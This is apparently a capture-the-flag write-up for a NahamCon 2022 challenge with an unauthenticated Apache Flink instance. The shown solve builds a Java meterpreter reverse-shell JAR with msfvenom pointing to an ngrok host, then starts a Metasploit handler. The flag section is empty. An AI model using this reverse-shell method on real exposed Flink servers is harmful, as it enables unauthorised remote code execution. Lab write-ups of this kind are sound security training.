# Flink

## Description
Author: @congon4tor#2334

Oooh no someone forgot to add auth in front of this application. Can you get the flag?

Press the Start button on the top-right to begin this challenge.
Connect with:

http://challenge.nahamcon.com:31020

Please allow up to 30 seconds for the challenge to become available.

## Solve
Apache Flink is a batch-processing software that runs Java programs. The "Submit New Job" tab allows us to upload a java executable and it will run on the machine. I will use `msfvenom` to craft a reverse shell:
```
user@arch:~/cyber/ctf/nahamcon-2022/babys-first-heartbleed$ msfvenom -p java/meterpreter/reverse_tcp -f jar LHOST=0.tcp.eu.ngrok.io LPORT=17496 -o shell.jar
Payload size: 5274 bytes
Final size of jar file: 5274 bytes
Saved as: shell.jar
```
Now I will set up the meterpreter in `msfconsole`
```
user@arch:~$ msfconsole 
                                                  
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v6.2.27-dev                          ]
+ -- --=[ 2266 exploits - 1189 auxiliary - 404 post       ]
+ -- --=[ 948 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use the resource command to run 
commands from a file
Metasploit Documentation: https://docs.metasploit.com/

msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD java/meterpreter/reverse_tcp
PAYLOAD => java/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:4444 
```

## Flag